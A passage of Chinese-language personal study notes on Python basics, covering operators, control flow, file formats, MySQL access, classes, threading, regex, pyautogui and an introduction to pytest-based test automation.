        #zip 将多个列表或元组对应位置的元素组合为元组，并返回包含这些内容的zip对象
        #list1 一个列表，用于生成键
        #list2 一个列表，用于生成值
        #如果两个列表len不一致，则字典与短len的长度相同
    """
    统计一个字符串中该出现次数最多的字符以及其出现次数。
    """
    n = input("请输入字符串：")
    dict_2 = {}
    for i in n:
        if i in dict_2:
            dict_2[i] += 1
        else:
            dict_2[i] = 1
    max_value = max(dict_2.values())
    for key,value in dict_2.items():
        if value == max_value:
            print(f"出现次数最多的字符是:{key},它的出现次数是:{max_value}")
	"""
	字典推导式
	fruits = ['apple', 'banana', 'cherry', 'date']
    counts = [10, 5, 8, 12]
    fruit_counts = {fruit: count for fruit, count in zip(fruits, counts)}
    print(fruit_counts)
	"""
```

### 运算符

```python
# 赋值运算符 =
单个变量 = 多个数据 # 右边的数据会打包成一个元组给变量接受，该过程叫做组包/打包
n个变量 = n个数据 # 左右两边的n必须一致，该过程也叫解包/拆包
    # 常量 定义常量本质上就是变量。如果非要定义常量，变量名必须全大写。
    
# 计算运算符 +、-、*、/、%(余数)、//(商)(向下取整)、**(幂)
	# 除号参与运算，其结果必定是浮点数
    # 浮点数参与运算，结果必定是浮点数
	# True和False可以参与数值运算，True表示数值1，False表示数值0
    # +/* 可以用于str、list、tuple的合并/叠加
    # * 可以用于重复输出

# 复合赋值运算符		
+=、-=、*=、/=、%=、//=、**=  # 先运算，再赋值

# 比较运算符  
> 、<、<=、>=、==、!= 
	# 比较运算符的最终结果必定是True或False
	# 六大数据类型都可以比大小，除数字以外类型是比较第一个元素的ascll值，相同则比较第二个，一次类推
    # 判断值是否相同用 == ，是否引用同一个变量用 is 

# 成员运算符
in 
not in

# 逻辑运算符
    # 空对象( "",[],(),{},set() ),数值为0的数字、False、None的布尔值属性为False 其他都为True
    # python万物皆对象，只要是对象都有布尔值属性 bool(对象) 
    
and 
	# 即使两边的元素不一样，但因为有元素，其布尔值均为True，会直接输出后面的内容
or
not # 取反，针对后面的内容布尔值属性取反，只会输出True或False

# 运算符优先级
	** # 幂
    * / % // # 乘除
    + -  # 加减
    <= < > >= # 比大小
    == != # 等于和不等于
    = %= /= //= -= += *= **= # 赋值和TR
    is  is not
    in  not in
    not and or 

# 其他
	# 多变量赋值
    a,b,c = 100,50,20
    a,b,c = (100,50,20)
    a = b = c = 100
    # 现在a=1，b=2，如何让a=2，b=1?
    a=1;b=2
    a,b=b,a
    # 数字函数
    abs() # 绝对值
    ceil() # 向上取整
    floor() # 向下取整
    round(x[n]) # 对x进行四舍五入,保留n位小数
```

### 控制结构

```python
# 顺序结构 从上到下，从左到右
    # 分支结构
    if
    elif
    else
    pass # 占位符，应善用，有助于理清条件关系
		# 三元表达式
    	value_if_true if condition else value_if_false # 条件为真时的命令 if 条件 else 条件为假时的命令
  
# 循环结构
for 变量 in 序列:
    循环体 	
    #常用格式如下
    for i in range(起始，结束，间隔)	
    # 可以取到起始，但取不到结束，如果range(整数)，[0,整数)
    # 当for嵌套到3层及以上后就要思考如何优化了，因为执行次数是按指数级进行的，非常庞大
    # break 当代码执行到break 会立马退出最近一层循环，不再进行循环。
    # continue 继续，执行时结束此次循环，进行下一次循环
# for .. else 结构
for 变量 in 序列:
	循环体
    if 条件:
        break
else: # 如果循环语句没有因为遇到break语句而终止，则当循环执行完成后，会执行else中的代码,遇到beark则不执行,while同理    
    命令
    
while 条件表达式：       # 通过一个条件来控制是否要继续要执行循环体中的语句,相当于if..else，True则执行，False则不执行
    循环体 # 相当于for
    # 同for 结构，也可以用break和continue函数，两者都可以无限嵌套
    # while True:常用于需要重复某些内容时.一般需定义打断条件,如果多层while True,可使用一个变量作为标识符以及if,使其条件满足时,从最内部的循环打断到指定的循环或取消循环
```

### 文件操作

#### 普通文件和相关命令

```python
# 文件操作
	# 使用open()函数打开文件时，默认采用GBK编码
    # 基本格式 
    f = open('文件地址','模式',encoding='编码') # 结尾需要加close,不然会一直占用内存
    f.close()
    # 常用格式
    with open ('文件地址','模式',encoding='编码') as f # 该模式当结束后可以自动关闭下面的操作,不会一直占用内存
    	# 模式
        # r: 以只读模式打开文件,文件的指针放在文件的开头
        # rb:同r,只不过额外用二进制格式打开文件,一般用于非文本文件,如图片、声音等
        # r+:可以读取,也可以从头开始写入新内容覆盖旧内容
        # rb+:同rb,只不过也是可以写入
        # w以只写模式打开文件
        # wb同w,只不过额外用二进制格式打开文件,一般用于非文本文件,如图片、声音等
        # w+打开文件后,先清空原内容,然后对其进行读写
        # wb+:以二进制格式打开文件,并且采用读写模式.一般用于非文本文件,如图片、声音等
        # a:以追加模式打开一个文件,若该文件已经存在,文件指针将放在文件的末尾,否则创建新文件用于写入
        # a+:同a,只不过还可以读
        # ab:同a,只不过额外用二进制格式打开文件,一般用于非文本文件,如图片、声音等
        # ab+:同ab,只不过还可以读
    # 读取文件
    file.read([size]) # 从头读取指定个数的字符,不指定则一次性全篇读取
    file.readline() # 读取一行,写几行读取几行
    file.readlines() # 读取全部行,返回一个列表
    file.seek(offset[,whence]) # file已打开的文件对象，offset指定移动的字符个数；whence为0表示从头开始计算，为1表示从当前位置计算，为2表示从文件尾开始计算
    # 写入文件
    file.write()
    
# 其他相关命令
file.tell() # 返回一个整数,表示文件指针的当前位置,整数为二进制模型下距离文件头的字节数

```

#### csv文件

```python
import csv # 导入csv
with open('plan.csv', 'r', encoding='utf-8') as f: # 读取csv文件
    list_f = list(csv.reader(f)) # 以列表的形式读取，lian_f的每一个元素是一个单独字符串，0号下标为其表头
    f.seek(0) # 光标返回文件头
    dict_f = list(csv.DictReader(f)) # 以字典的形式读取，列表的每一个元素是一个字典，每一个元素的键为表头
    dict_header = list(dict_f[0].keys())
    
# 列表写入
with open('englishlist.csv','w',newline='',encoding='utf8') as f: # 写入csv文件
    a = csv.writer(f) # 以列表的形式写入文件
    a.writerow(list_header) # 写入表头
    a.writerows(list_score_e) # 写入数据信息，传入的是每个元素为字符串的列表
    
# 字典写入
with open('englishdict.csv','w',newline='',encoding='utf8') as f: # 写入csv文件
    a = csv.DictWriter(f, fieldnames=dict_header) # 以字典的形式写入， fieldnames=dict_header定义表头
    a.writeheader() # 写入表头
    a.writerows(dict_score_e) # 写入数据信息，传入的是每个元素为字典的列表
```

#### json文件

```python
# 读取数据
 # loads
    with open('jsonname.json','r',encoding='utf-8') as f:
        info = f.read() # 读取json数据
        data_py = json.loads(info) # 将json数据转为py数据

 # load
 	with open('jsonname.json','r',encoding='utf-8') as f:
    	data_py = json.load(f) # 读取并转换为py数据
    
# 写入数据
 # dumps
    with open('data.json','w',encoding='utf-8') as f:
        data_json = data_new_py # 修改data_py数据
        newdata = json.dumps(data_json,ensure_ascii=False) # 将data_json转变为json数据
                                                           # ensure_ascii=False 防止写入时乱码
        f.write(newdata) # 写入json数据
 # dump
    with open('data.json','w',encoding='utf-8') as f:
        data_json = data_new_py # 修改data_py数据
        json.dump(data_json, f,ensure_ascii=False) # 转换并写入文件
"""
 json字符串  
    json字符串本质上就是字符串 只不过是比较特殊的字符串  可以进行json格式化变成对应语言对应类型
    json.loads(json字符串)  将json字符串变成python的数据类型
    json.dumps(python数据类型)  将python数据类型变成json字符串
json字符串的语法规则
    用双引号包裹表示 字符串类型
    null表示python中的None
    false和true表示False和True
    使用 [] 表示数组 对应python中[]和() 
    使用 {} 表示对象 对应python中的字典  字典的键在json中称之为属性
"""
```

#### xls文件

```python
import xlrd # 导入读取模块
import xlwt # 导入写入模块

class Excelop():
    def __init__(self):
        self.readdata()

    def readdata(self):
        workbook = xlrd.open_workbook(r"D:\qqfile\computerCal.xls") # 打开文件
        # 标签名
        sheet_names = workbook.sheet_names() # 获取xls文件中的所有标签页名
        sheet = workbook.sheet_by_name(sheet_names[0]) # 设定写入数据的标签页
        # 下标
        sheet = workbook.sheet_by_index(sheetindex)
        self.data_list = []
        for i in range(sheet.nrows): # sheet.nrows 为有数据的到无数据的行数
            self.data_list.append(sheet.row_values(i)) # 依次读取每行的数据

    def witerdata(self):
        obj = xlwt.Workbook(encoding='utf8') # 定义写入格式
        sheetobj = obj.add_sheet('demo') # 定义写入表的标签名
        for i in range(len(self.data_list)):
            for j in range(len(self.data_list[0])):
                sheetobj.write(i, j, label=self.data_list[i][j]) # i为行数，j为列数，进行写入操作
        obj.save('testdemo.xls') # 保存文件

# 读取excel
import xlrd
xls = xlrd.open_workbook(xls文件路径) # 打开一个xls文件，并返回一个对象

	# 标签类
    sheet_names = xls.sheet_names() # 返回所有标签名
    sheet = xls.sheet_by_index() # 通过标签的下标选择需要操作的标签
    sheet =xls.sheet_by_name() # 通过标签名选择需要操作的标签
    
    # 行类row
    num_rows = sheet.nrows # 该标签下的行数
    sheet.row(rowx) # 返回该行的每个单元格的类型和值
    sheet.row_slice(rowx[, start_colx=0, end_colx=None]) # 返回start_colx列到end_colx=None列第rowx行的单元格的类型和值
    	sheet.col_values(rowx[, start_colx=0, end_colx=None]) # 返回start_colx列到end_colx=None列第rowx行的单元格的值
        sheet.col_types(rowx[, start_colx=0, end_colx=None]) # 返回start_colx列到end_colx=None列第rowx行的单元格的类型
        
    # 列类col
    num_cols = sheet.ncols  # 该标签下的列数
    sheet.col(colx) # 返回该列的每个单元格的类型和值
    sheet.col_slice(colx[, start_rowx=0, end_rowx=None]) # 返回start_rowx行到end_rowx=None行第colx列的单元格的类型和值
    	sheet.col_values(colx[, start_rowx=0, end_rowx=None]) # 返回start_rowx行到end_rowx=None行第colx列的单元格的值
        sheet.col_types(colx[, start_rowx=0, end_rowx=None]) # 返回start_rowx行到end_rowx=None行第colx列的单元格的类型
     
    # 单元格cell
    cell = sheet.cell(rowx,colx) # 获取指定单元格的对象
        cell.value # 获取该单元格的值，等同于sheet.cell_value(rowx,colx)
        cell.ctype # 获取该单元格的类型,等同于sheet.cell_type(rowx,colx)
        
# 写入xlwt
import xlwt
xls = xlwt.Workbook(encoding='utf8')
sheetobj = obj.add_sheet('demo') # 定义写入表的标签名
for i in range(len(self.data_list)):
    for j in range(len(self.data_list[0])):
        sheetobj.write(i, j, label=self.data_list[i][j]) # i为行数，j为列数，进行写入操作
obj.save('testdemo.xls') # 保存文件

```

#### xlsx文件

```python
pip install openpyxl
from  openpyxl import load_workbook # 该类用来读取和追加已有的文件
wb = load_workbook("C:\新建 Microsoft Excel 工作表.xlsx")
wbsheet = wb['Sheet1']
for row in wbsheet.iter_rows(values_only=True): # 读取每一行的值
    print(row)
data_to_append = 'New Data 1' # 多个值可以用列表
wbsheet.cell(row=4, column=5, value=data_to_append) # 单元格插入
wb.save("C:\新建 Microsoft Excel 工作表.xlsx") # 指定表的保存路径
wb.close()
```



#### 数据库

```python
pip install pymysql
from pymysql import connect
from pymysql.cursors import DictCursor
conn = connect(host='localhost',port=3306,user='root',password='123456',db='school',charset='utf8') # 连接mysql
cur = conn.cursor() # 创建游标,以列表的形式读取
	cur = conn.cursor(DictCursor) # 以字典的形式读取 
cur.execute(sql语句) # 执行sql语句
cur.fetchone() # 获取查看结果集中的下一条记录
cur.fetchall() # 获取查看结果集中的所有记录
conn.commit() # 提交执行，结束事务
cur.clsoe() # 关闭游标
conn.close() # 关闭连接

coon.autocommit(1) # 自动提交修改，每个单独的 SQL 语句都会立即执行并提交到数据库，1表示True，0表示False
conn.begin() # 开始事务，autocommit会影响其中的命令
conn.rollback() # 回滚

```

### 捕获异常

```python
# 语法错误是捕获不到的。运行错误才会捕获
# 有多个异常时，程序运行到第一个异常时就会抛出异常
try:
    可能会出现异常的命令
except Exception as e: # 等同于except: ,均可捕获所有的异常,print(e)可打印出异常的内容,e非必要
    raise e # 可向外传递异常
    出现异常后执行的命令
else:
    不出现异常执行的命令
finally:
    # 无论是否异常都执行的命令,即使上方中有return,且当finally中有return中的时会覆盖之前的return

# 面向对面编程时存在多个try和自定义异常,无法找到抛出异常的准确位置,可以使用traceback.print_exc()打印出异常路径
traceback.print_exc()
```

### 包和模块

```mermaid
graph LR;
UI:与用户交互,软件测试-->代码处理:控制层,具体实现查询功能-->读写文件:底层代码,核心
```

程序大概可以分为三部分：UI 层、代码层、底层

- ui 层面命令为 print 和 input 的内容
- 代码层又叫功能层，是一些关于功能的命令
- 底层为文件的读写，其路径是相对于运行文件的的文件路径
  - 运行命令单独建一个 py 文件，命名为 run 或见名知意的
- 各个层面通函数的参数传递来进行实现

### 定义函数

```python
def function_name():
    pass  # 函数的命令
	return value
		   # 返回一个变量的值，如果返回了多个变量，会打包成一个元组。变量不需要在function_name括号中体现
		   # return后面的代码不再进行执行，所以应将其放在最后
    	   # 无return后省略参数返回一个None
           # 函数中可以有多个return，但最终只会有一个return的返回
function_name() # 调运函数，无参数形式
	function_name(value) # 有函数形式
# 实参和形参
	# 形参 定义函数时，函数括号中的参数
    # 实参 调用函数时，函数括号中的参数
    	# 位参 根据定义函数的参数顺序，在调用函数时进行填写
        # 关键字参数 在调用函数时，以 参数 = 值 的形式进行填写
        # 参数默认值 定义函数时可以在函数括号中以 参数 = 值 的形式设置默认值，默认值参数应放在非默认值参数后面
        # 可变参数 闯入函数的实际参数可以是0个、一个、两个到任意个
            # *args 传递不定长的普通参数，为元组。*表示拆包
            # **kwargs 传递不定长的关键字参数，为字典。在调用函数时要以关键字形式传参，字符串不用加引号
            	# 两个同时使用时，*args应放在**kwargs前面
    # 参数顺序
        # 位置参数 - args参数 - 默认值参数 - kwargs参数
            
# 全局变量、局部变量
	global
	# 函数内的变量为局部变量，函数外的变量为全局变量
    # 若想函数内的变量结果可以影响函数外的变量，可以使用 global 变量名

# 匿名函数
	# 函数名 = lambda 参数名：含参数名表达式
    function = lambda x,y:x * y
    print(function(5,10))
    # 匿名函数的if..else：
    name = lambda x,y:x+y if x>=y else x-y
    # 如果x>=y，则输出x+y，否则x-y

# 函数递归
	# 函数在内部调用自己，这个就叫递归，递归函数必须要有一个停止条件否则会死循环，递归是有限制的 不能递归层数太多 否则会内存溢出。
    # 斐波那契数列f(n)=f(n-1)+f(n-2)
  def fun(n):
      if n==1:
          return 1
      elif n==2:
          return 1
      else:
          return fun(n-1) + fun(n-2)

# 定义主程序
if __name__ == '__main__': # 检查当前模块是否作为主程序直接运行，当直接运行这个脚本时，__name__会被自动设置为'__main__'，立即运行下面的函数,若被其他模块导入,其__name__不为__main__,不会执行下面的内容。
    main_menu() # 主程序名字
```

### 类和对象

```python
# 命名时单词首字母大写 三个特性:继承、多态、封装
# 属性：类的静态特征     行为：类的动态特征   对象 # 具体的一个事物
# 使用对象和类同时更改同一个类属性，则使用对象访问类属性优先。用哪个对象调用，就输出哪个对象的值。
class 类名():
	pass # 类变量,若在其他文件导入该类，会自动执行类变量,因此最好用@classmethod来定义  
	     # 类变量是所有实例共享的，可以通过类名或实例访问。
         	# 对于不可变类型的类变量，实例重新赋值会创建同名的实例变量，不会影响类变量。
            # 对于可变类型的类变量，实例对其进行修改会直接修改类变量，因为它们引用的是同一个可变对象。
    def __init__(self): # 类的初始化方法，在创建实例时会自动调用,对实例进行初始化操作.可接受其他参数，用于初始化实例的属性。
        self.变量 # 在方法中以self.关键字开头的变量为实例变量    
                 # 实例变量是实例私有的，每个实例可以独立拥有自己的实例变量。如果实例没有自己的实例变量，则会访问类的类变量。
        	 	 # 在类内部,类可通过self关键字来访问实例属性
    def public_method(self,参数):# 公共方法,又叫实例方法,供外部调用
        						# 在实例方法中,不加self前缀为局部变量,无法在其他实例方法中使用,加上self前缀后成为实例属性,可以在其他实例方法中使用
        命令
        return 返回值
    def __private_method__(self,参数) # 系统定义名字，类似__init__
    	命令
        return 返回值
   	def _private_method(self,参数) # 只允许类本身和子类访问,不能用from module import * 导入(在外部可以用实例名._XXX 方式访问(不建议这样做))
    	命令
        return 返回值
    def __private_method(self,参数) # 私有方法,只能在类内部使用,(在外部可以用 实例名._类名__XXX 方式访问(不建议这样做))
    	命令
        return 返回值

# 装饰器 
	@staticmethod   # 静态方法 类似普通的函数。不需要cls或self参数
    				# 在类的所有实例之间共享,并且不访问实例的状态。调用静态方法修改类变量会影响所有实例,但静态方法本身不能直接修改实例的属性。若要修改实例属性,应使用实例方法。
	@classmethod    # 类方法.自身参数为cls。是绑定到类而不是实例的方法，因此可以通过类名直接调用，而不需要先创建类的实例.只能修改类属性，不能修改实例属性
	@property 	# 将一个方法转变为属性，使得实例调用该方法时,可同访问属性一样进行调用。这通常用于创建只读属性，初始值可以通过实例化对象时的参数设置，但后续不能直接通过赋值来修改。若需要修改属性的值，可以在类中编写特定方法，并通过调用该方法来实现。
    # 装饰器实现逻辑
    	# 创建一个函数1，该函数通常接受一个函数2作为参数，并返回一个新的函数3(通常是一个闭包)，在想要应用装饰器的函数4上方用@函数名调用装饰器函数，运行函数4时会先把函数4以参数的形式传递给函数1，然后运行函数3
        # 函数基本格式
        def 函数1(func):
            def 函数2(*args, **kwargs):
				result = func(*args, **kwargs)
                return result
            return 函数2
        # 类基本格式(在 __init__ 方法中打开资源，在 __call__ 方法中执行装饰逻辑，然后在 __del__ 方法中关闭资源。)
        class 类名:
            def __init__(self):
                self.变量名 = func
            def __call__(self,*arhs,**kwargs):
                result = self.变量名(*arhs,**kwargs)
                return result
 
# 继承 在子类的类定义中指定父类的名称，即可实现继承。子类可以继承父类的所有公共属性和方法
	# 修改父类的构造方法
    super().__init__(...)  # 继承父类的构造方法
    del self.参数名 # 删除该参数
    self.新参数名 = 新内容 # 增加参数
    # 建议避免直接修改父类的已有属性，应通过扩展子类的新属性来实现特定需求。
    # 实例方法同构造方法
    # 所有的类默认继承 object 类

# 常见问题
	# 只是导入并未应用模块,却会因此出现问题,常见于类变量为创建webdirver的浏览器对象
    	# 因为代码是从上到下运行,即使模块未被引用,也会进入到该模块中从上到下搜索一遍,因为类变量不需要创建实例即可执行,因此当类变量为创建webdirver的浏览器对象时,会自动执行一次.解决方法是不要把类变量直接作为创建浏览器对象,而是通过类方法或实例方法来创建
    # 循环导入
    	# 常见于两个模块或多个模块相互调用,形成了闭环,导致代码从上到下执行时无法跳出
```

### 进程和线程

```python
# 进程 多进程不共享全局变量
terminate() # 销毁子进程
###################################
import multiprocessing # 导入相关模块
import time
# 定义一个进程执行的任务函数
def task_function():
    for i in range(5):
        print(f"Process {multiprocessing.current_process().name}: Count {i}")
        time.sleep(0.5)
if __name__ == '__main__':
    print('开始')
    process1 = multiprocessing.Process(target=task_function)
    process2 = multiprocessing.Process(target=task_function)
    # 启动进程
    process1.start()
    process2.start()
    # 等待进程执行完成,进程执行完后会自动销毁
    process1.join()
    process2.join() 
    print('结束')

# 线程,多线程在执行时是无序的,默认情况下主线程结束后，子线程必须结束
Thread([group[,target[,name[,args[,kwargs]]]]])
	# group 值为None，为以后版本而保留
    # target 表示一个可调用对象，默认为None
    # name 表示当前线程名称
    # args 将参数以元组传递给 target()函数
    # kwargs 将参数以字典传递给 target()函数
#############################
import threading # 导入线程模块
import time

def work(people,num,ranges): # 定义线程函数
    total = 0
    for i in range(int(ranges/num)):
        total += num
        print(f"{people}现在的工作量为{total}")

if __name__ == '__main__':
    print('开始')
    thread1 = threading.Thread(target=work,args = ('李华',100,500000)) # 以元组传递参数
    thread2 = threading.Thread(target=work,kwargs ={"people":'张三','num':100,'ranges':100000}) # 以字典传递参数
    thread3 = threading.Thread(target=work,args = ('李华',0.1,5000000),daemon=True) # 守护主线程 或者可以用thread3.setDaemon(True),主线程结束时，守护线程也会随之结束
    thread1.start() # 启动1号线程
    thread2.start() # 启动2号线程
    thread1.join() # 阻塞线程,确保执行完成后再进行主线程
    thread2.join() # 阻塞线程,确保执行完成后再进行主线程
    thread3.start() # 启动3号线程
    time.sleep(0.1) # 让主线程等待0.1秒
    print('结束')
 
# 线程上锁和解锁
import threading

# 共享变量
shared_resource = 0

# 创建互斥锁 在线程编程中，线程之间可能会共享一些共享资源，比如全局变量或者共享的数据结构。当多个线程同时访问和修改这些共享资源时，可能会引发并发问题
lock = threading.Lock()

def increment():
    global shared_resource
    for _ in range(100000):				
        lock.acquire()# 锁住资源
        shared_resource += 1
        lock.release()# 释放锁

def decrement():
    global shared_resource
    for _ in range(100000):
        lock.acquire()# 锁住资源
        shared_resource -= 1
        lock.release()# 释放锁

# 创建两个线程
thread1 = threading.Thread(target=increment)
thread2 = threading.Thread(target=decrement)

# 启动线程
thread1.start()
thread2.start()

# 等待线程执行完成
thread1.join()
thread2.join()

print("共享资源的值:", shared_resource)
```

### 正则表达式

```python
import re # 导入re模块
		  # 在正则模式字符串前面加上 r 或 R 前缀,以免反斜杠字符 \ 被解释为转义字符
# 元字符
. # 匹配除换行符以外的任意字符
\w # 匹配字母、数字、下划线或汉字
\W # 匹配\w以外的内容
\s # 匹配单个的空白符(包括Tab键和换行符)
\S # 匹配\s以外的内容
\d # 匹配数字
\b # 匹配单词的开始或结束,单词的分节符通常是空格、标点符号或换行
^ # 行头
$ # 行尾

# 限定符
* # 匹配前面字符0次及以上
    ? # 匹配前面字符0次或1次
    + # 匹配前面字符1次及以上
{n} # 匹配前面字符n次
{n,} # 匹配前面字符n次及以上
{n,m} # 匹配前面的字符最少n次,最多m次
[] # 匹配括号里面的内容，任一
	# [a-z] 匹配a到z的小写字母
    # [0-9] 匹配任何数字
[^] # 排除括号内的内容
() # 分组，用于捕获匹配的子字符串或为子表达式定义范围。

# 条件选择
|
	# 匹配身份证,15位或18位,15位为纯数字,18位前17位为数字,最后一个是校验码,可以是数字或字符X
    (^\d{15}$) | (^\d{18}$) | (^\d{17})(\d|x|X)$
    
# 转义字符
\

# 常用的函数
re.search(pattern, string, flags=0) # 在字符串中搜索匹配指定模式的内容，返回第一个匹配的结果，如果没有匹配到则返回`None`。
re.match(pattern, string, flags=0) # 在字符串开头匹配指定模式的内容，返回第一个匹配的结果，如果没有匹配到则返回`None`。
re.findall(pattern, string, flags=0) # 在给定的字符串中查找所有匹配指定模式的内容，返回一个包含所有匹配结果的列表。
re.finditer(pattern, string, flags=0) # 在给定的字符串中查找所有匹配指定模式的内容，返回一个包含所有匹配结果的迭代器。
re.sub(pattern, repl, string, count=0, flags=0) # 在给定的字符串中查找所有匹配指定模式的内容，并将其替换为指定的字符串。
re.split(pattern, string, maxsplit=0, flags=0) # 根据指定的模式对字符串进行分割，返回一个包含分割结果的列表。
re.compile(pattern, flags=0) # 编译正则表达式模式，返回一个正则表达式对象，可以用于多次匹配，提高效率。

# `pattern`是正则表达式的模式字符串，`string`是要匹配的字符串，`flags`是可选的标志参数，用于控制匹配的行为。`repl`是替换字符串，用于在`re.sub()`中进行替换操作。`count`用于限制`re.sub()`替换的次数。`maxsplit`用于限制`re.split()`分割的次数。
re.S # 用于指定在匹配过程中将换行符视为普通字符，从而允许跨行匹配
```

### 常用函数

#### random

```python
import random
random.random() # 随机生成[0,1)的数
random.randint(50,100) # 随机生成[50,100]的整数
random.uniform(50,100) # 随机生成[50,100]的浮点数
random.choices(序列[,k=次数]) # 从该序列随机取几次元素，默认为1
```

#### time

```python
time.time()    # 距离计算机元年1970年1月1日的秒数
time.strftime('%Y-%m-%d %H:%M:%S') # 以2023-07-29 11:31:08形式显示当前时间
time.sleep(2) # 强制等待2秒
```

#### faker

```python
pip install faker # 安装
from faker import Faker # 导入
f=Faker('zh-cn')  #生成的格式为中国的常用格式
f.date_between(datetime.date(2022, 1, 1), datetime.date(2022, 12, 31)) # 两个时间之间
```



### os模块

```python
# 路径是否是一个文件
os.path.isfile(pathfile) 
# 路径是否是一个目录
 os.path.isdir(pathfile)
__file__ # 用于获取当前执行的脚本文件的路径
os.path.dirname(__file__) # 当前文件的上一级目录
os.path.join(os.path.dirname(__file__),'demo.py') # 当前文件的上一级目录和demo.py的拼接
os.path.abspath(__file__) # 当前文件的绝对路径

# 运行cmd命令
os.system(command) 
	# 返回值是命令执行的退出状态码
   	# 输出直接打印到标准输出
    # 可使用subprocess来获取执行结果
os.popen(command, mode='r', buffering=-1)
	# 命令执行完成后，返回一个文件对象,需要手动关闭返回的文件对象
    # 如果命令执行输出有中文掺杂，最好不要使用这个命令，它的编码可能会存在一定问题。
    # 若坚持使用popen，可以用
    var_name = os.popen(command) # 必须先指定个变量,不然会提示对象已关闭,且不能合并
    var_name.buffer.read().decode('utf-8')

# 读取一个文件夹下所有的文件
## 法一
import os
path = '.temp/mr' # 文件夹路径
names = os.listdir(path) # 获取该文件下的所有文件的名称列表
all = []
for item in names:
    f = open(path+'/'+item)
    new = []
    for i in f:
        new.append(i)
        all.append(new)
    f.close()
for i in all:
    print(i)
## 法二
for root, dirs, files in os.walk(r"C:\Users\l1823\Downloads"):
    print(root) # 目录名
    print(dirs) # 子文件夹名
    print(files) # 子文件

```



### pyautogui模块

```python
# pip install pyautogui

# 获取屏幕尺寸
screen_width, screen_height = pyautogui.size() 

# 鼠标操作
    # 点击
    pyautogui.click(x,y[,clicks = 1,interval=0.0, button=PRIMARY, duration=0.0]) # 在X,Y处点击一次,间隔零秒,
    # 滚动	
    pyautogui.scroll(-5000[,x,y]) # 在鼠标当前位置或x,y位置向下滚动5000个单位量

# 键盘操作
    # 输入
    pyautogui.typewrite(内容,interval=字符输入的间隔频率)  # 输入内容到当前屏幕
    # 热键
    pyautogui.hotkey()
    # pyautogui输入中文字符的方法
    1.导入模块  import pyperclip # pyperclip 剪切板
    2.使用 pyperclip.copy('想要输入的中文字符')  进行复制
    3.使用 pyautogui.hotkey("ctrl","v") 进行粘贴  

# 移动
    # 拖拽
    pyautogui.drogTo(x,y,duration=2) # 用两秒,将当前光标所在位置的元素拖动xy量
    # 移动光标
    pyautogui.moveTO(x,y) # 

# 截图操作
pyautogui.screenshot([,region = None]) # region为None时截取全屏,region=[目标图片左上角x,目标图片左上角y,目标图片长度,目标图片宽度] 自定义截图区域 
# 该功能实际上是pyscreeze模块
# pyautogui的截图本质是操控键盘和鼠标,因此需要将截图对象保持在前端

# 图像匹配
pyautogui.locateCenterOnScreen(图片路径,minSearchTime=0,confidence=0.8) # minSearchTime最小搜索时间,confidence:图片匹配度
# pyautogui的图片识别不能够跨分辨率识别，因为现在用户的屏幕分辨率不一致，像有的是1080p、2k、4k，甚至还有8k，因此不能做测试框架的图像识别方法，所以使用airtest
```



### 其他命令

```python
id()  # 查看变量的内存地址。
bool(元素) # 转元素为布尔类型
len(序列)    #序列的长度
max(序列)       #序列的最大值
min(序列)        #序列的最小值
sum(序列)       #序列的和
sum(序列)/len(序列)#序列的平均值
pip install 框架名 # 安装框架
    pip freeze > requirements.txt # 将包导出到一个文件
    pip install -r requirements.txt # 从文件中读取安装包
    pip search package-name # 寻找包名
    pip install git+https://github.com/user/repo.git # 指定安装包
    pip install /path/to/package.whl # 指定路径安装包
    pip show package_name # 获取框架的版本和一些信息
help() # 用于查看函数或模块用途的详细说明
divmod() # 返回一个包含商和余数的元组
sorted() # 对所有可迭代的对象进行排序
ord() # 转为ASCLL码



map(function, iterable, ...) # 对于传入的每个可迭代对象中的元素，依次调用 function 函数，并将结果作为一个新的迭代器返回
```

## 自动化

### 开展自动化流程

- `        在项目文件夹下构建不同的文件夹 对应的文件夹存放对应的内容`
- `business  存放项目中的业务流程代码`
  
- `        testcase  存放项目中的测试用例(校验的)代码`
  
- `        test      存放项目中自己调试测试的脚本代码`
  
- `        report    存放项目运行完成产生的自动化报告`
  
- `        common    公共目录 存放项目中一些公共的函数或者类`

### 相关概念

- DDT思想(data driver test)(数据驱动测试):
  - `数据的个数决定了测试用例执行的次数`
  - `将数据写在一个可迭代变量中存储`

- POM(或PO)思想(Page Object Model):页面对象模型 
  - `将一个页面做为一个类,页面上的元素、定位信息以及固定操作作为类属性,页面上的操作流程用方法进行封装`
  - `        实现pom流程`
    - `构建基类,内容是每个页面公有的行为或属性`
    - `将每个页面上的定位信息以及固定操纵作为类属性`
    - `页面继承基类`

- 单例思想

  - `应确保一个对象在程序运行的过程中只产生一份) `

    - `浏览器的创建应在类属性,且用类方法构建`

    - `只要涉及到得到浏览器对象的操作都去调用这个类得到`

    - `        单例技术的实现:`

      - ```python
        class GetDriver:
            driver =None
            @classmethod
            def get_driver(cls):
                if cls.driver is None: # TODO 条件成立 说明driver还没有创建过  如果条件不成立 说明driver已经创建产生
                    cls.driver = webdriver.Chrome()
                return cls.driver
        ```

        



### 单元测试框架--pytest框架

- `单元测试框架应有的特性:`
  - `能够自动收集、执行并管理维护测试用例`
  - `提供断言机制`
  - `自动生成拥有可读性的测试报告`
  - `拥有异常容错`
  

#### 基本用法

```python
# 安装
pip install pytest
# 导入
import pytest
# 使用
pytest.main() 
	# 用例的默认收集规则(可以通过pytest.ini配置文件更改)
    	# 文件名(模块名) 必须是 test_开头 或者 _test.py 结尾
        # 类名必须以Test开头,且类中不允许出现__init__ 构造方法
    	# 方法或函数必须以test开头
            # 没有用例收集到排查步骤:
            	# 看rootdir路径是否正确
            # 文件名、类名、方法名是否符合用例收集规则

# pytest常用的参数(一般对于固定的参数,会写在配置文件中,对于会变更的参数写在主函数)
	# 传参方式
    1.pytest.main( ["参数1","参数2",.... ])
    2.配置文件传递  addopts= 参数1 参数2.. 
    # 常用参数
    -s  # 输入代码中的print信息
    -v  # 详细输出
    -k  # 指定执行测试模块、用例, 可以使用and or not
    -x  # 失败立即停止
        --maxfail=数字   # 达到指定数量的错误后再停止
    -n=数字   # 使用指定数量的线程数执行用例 需要安装 pip install pytest-xdist
    --reruns=数字  # 失败重跑指定次数   需要安装 pip install pytest-rerunfailures  
     			  # 如果需要给单独的用例添加失败重跑功能  在用例或类上方写上  @pytest.mark.flaky(reruns=数字)
    --count=数字  # 重复执行指定次数  需要安装 pip install pytest-repeat
     			 # 如果需要给单独的用例添加重复执行功能  在用例或者类的上方写上  @pytest.mark.repeat(数字)

# pytest断言
assert 条件[,] # 当断言条件为假时，会触发 AssertionError 异常，用于指示出现了错误或不符合预期的情况。并返回提示语句

